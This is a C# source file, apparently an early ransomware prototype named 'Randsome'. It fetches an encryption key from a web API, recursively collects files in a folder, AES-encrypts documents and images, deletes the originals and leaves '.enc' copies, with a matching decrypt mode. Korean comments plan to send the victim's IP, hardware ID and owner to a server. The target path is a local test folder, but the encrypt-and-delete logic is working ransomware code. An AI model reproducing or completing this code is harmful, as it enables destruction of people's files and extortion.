using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.IO.Compression;
using System.Linq.Expressions;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;
using System.Net;
using System.Net.Sockets;

namespace Randsome
{
    public class EFile
    {
        public byte[] data;
        public string path;
    }
    
    class Program
    {
        /// <summary>
        /// Encrypt Target List
        /// </summary>
        public static List<EFile> EncryptionList = new List<EFile>();
        public static string decKey = "";
        static string api = "BUJD-0TCM-RCD1-0VCM";
        static string rand = "https://randomapi.com/api/za8lglqx?key=";
        public delegate void SeedCreateCallback(string json);
        public enum ProccessMode { Encrypt, Decrypt };
        /// <summary>
        /// 웹으로부터 암호화 키를 받아옴
        /// 보내야할 인자 : 아이피주소 | PC-HWID or PC-idenfiler-key | 소유자
        /// 받아야할 인자 : Encryption Key
        /// 디비에 저장해야할 것 : 클라가 보낸인자 / 서버가 보낸인자 전부.
        /// </summary>
        public static string WebReq(string url, SeedCreateCallback callback)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Credentials = CredentialCache.DefaultCredentials;
                WebResponse response = request.GetResponse();
                Stream dataStream = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataStream);
                string data = reader.ReadToEnd();
                reader.Close();
                response.Close();
                callback(data);
                return data;
            }
            catch (WebException exception)
            {
                int httpCode = (int)((HttpWebResponse)exception.Response).StatusCode;
                string mJson = "{ \"HTTP_ERROR_CODE\": " + httpCode + ",\"ERROR_CODE_URL\": \"" + url + "\"}";
                return mJson;
            }
        }




        /// <summary>
        /// 해당 확장자가 암호화 타입인지 검사(미구현)
        /// </summary>
        /// <param name="extention"></param>
        /// <returns></returns>
        public static bool IsEncryptionType(string extention, int fileSize = 0)
        {
            if (extention == ".xlsx" || extention == ".jpg" || extention == ".txt" || extention == ".png" || extention == ".psd")
            {
                return true;
            }
            else
            {
                return false;
            }
        }
  


        /// <summary>
        /// 해당 폴더를 기준으로 폴더를 파인더함
        /// </summary>
        /// <param name="path"></param>
        public static void FolderFinder(string path)
        {
            var m = Directory.GetDirectories(path);
            var nFiles = Directory.GetFiles(path);
            for (int i = 0; i < nFiles.Length; i++)
            {
                AddList(nFiles[i]);
            }
            if (m.Length != 0)
            {
                for (int i = 0; i < m.Length; i++)
                {
                    FolderFinder(m[i]);
                }
            }
          
        }

        public static void AddList(string path)
        {
            EFile efile = new EFile();
            {
                efile.data = System.IO.File.ReadAllBytes(path);
                efile.path = path;
                EncryptionList.Add(efile);
            }
        }

        
        public static void Proccess(ProccessMode Mode, string DecryptKey = null)
        {
            if (Mode == ProccessMode.Encrypt)
            {
                for (int i = 0; i < EncryptionList.Count; i++)
                {
                    //Original
                    var originalExtention = Path.GetExtension(EncryptionList[i].path);
                    Console.Write(EncryptionList[i].data.Length +"bytes");
                    if (IsEncryptionType(originalExtention, EncryptionList[i].data.Length))
                    {
                        var encBytes = _Encrypt(EncryptionList[i].data);
                        System.IO.File.Delete(EncryptionList[i].path);
                        System.IO.File.WriteAllBytes(EncryptionList[i].path + ".enc", encBytes);
                    }
                }
            }
            else
            {

                for (int i = 0; i < EncryptionList.Count; i++)
                {
                    var extention = Path.GetExtension(EncryptionList[i].path);
                    if (extention == ".enc")
                    {
                        decKey = DecryptKey;
                        var decByte = _Decrypt(EncryptionList[i].data);
                        System.IO.File.Delete(EncryptionList[i].path);
                        System.IO.File.WriteAllBytes(EncryptionList[i].path.Replace(".enc", ""), decByte);
                    }
                }
            }
        }
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("input 'e' to test encryption.\n else For decryption, input 'd'.");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("Input :");

            string input = Console.ReadLine();
            if (input.ToLower() == "e")
            {
                WebReq(rand + api, (string json) =>
                {
                    var mapper = LitJson.JsonMapper.ToObject(json);
                    string key = mapper["info"]["seed"].ToString();
                    {
                        decKey = key;
                        FolderFinder(@"C:\Users\user\source\repos\Randsome\Randsome\bin\Debug\TestFolder");
                        Proccess(ProccessMode.Encrypt);
                        Console.WriteLine("\n"+decKey);
                    }
                });
            }
            else if (input.ToLower() =="d")
            {
                Console.WriteLine("\n\n input decryption key. ");
                Console.Write("Input : ");
                decKey = Console.ReadLine();
                FolderFinder(@"C:\Users\user\source\repos\Randsome\Randsome\bin\Debug\TestFolder");
                Proccess(ProccessMode.Decrypt, decKey);      
            }
            return;
         
        }


        public static byte[] _Encrypt(byte[] input)
        {
            PasswordDeriveBytes pdb =
              new PasswordDeriveBytes(decKey, // Change this
              new byte[] { 0x43, 0x87, 0x23, 0x72, 0x01, 0x02 }); // 바이트
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,
              aes.CreateEncryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }


        public static byte[] _Decrypt(byte[] input)
        {
            PasswordDeriveBytes pdb =
              new PasswordDeriveBytes(decKey, // Change this
              new byte[] { 0x43, 0x87, 0x23, 0x72, 0x01, 0x02 }); // Change this
            MemoryStream ms = new MemoryStream();
            Aes aes = new AesManaged();
            aes.Key = pdb.GetBytes(aes.KeySize / 8);
            aes.IV = pdb.GetBytes(aes.BlockSize / 8);
            CryptoStream cs = new CryptoStream(ms,
              aes.CreateDecryptor(), CryptoStreamMode.Write);
            cs.Write(input, 0, input.Length);
            cs.Close();
            return ms.ToArray();
        }
    }


    }
